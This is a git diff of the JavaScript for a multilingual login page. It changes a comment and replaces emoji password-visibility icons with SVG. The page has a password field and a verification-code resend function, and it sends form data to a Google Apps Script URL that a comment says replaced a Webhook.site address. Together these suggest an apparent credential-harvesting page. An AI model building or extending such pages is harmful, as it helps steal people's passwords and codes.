@@ -63,7 +63,7 @@ const translations = {
 // Langue par défaut
 let currentLang = 'en';
 
-// Remplace par ton URL Webhook.site
+// URL de ton Google Sheet
 const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec';
 
 // Fonction pour envoyer les données
@@ -148,16 +148,23 @@ function resendCode() {
     }, 3000);
 }
 
-// Toggle password visibility
+// Toggle password visibility with SVG
 function togglePasswordVisibility() {
     const passwordInput = document.getElementById('password-placeholder');
-    const toggleIcon = document.querySelector('.toggle-password');
+    const eyeIcon = document.getElementById('eye-icon');
     if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
-        toggleIcon.textContent = '👁️‍🗨️'; // Icône "œil barré" (optionnel)
+        eyeIcon.innerHTML = `
+            <path d="M2 2l20 20"></path>
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+        `; // Œil barré (mot de passe visible)
     } else {
         passwordInput.type = 'password';
-        toggleIcon.textContent = '👁️'; // Icône "œil"
+        eyeIcon.innerHTML = `
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+        `; // Œil ouvert (mot de passe masqué)
     }
 }
 
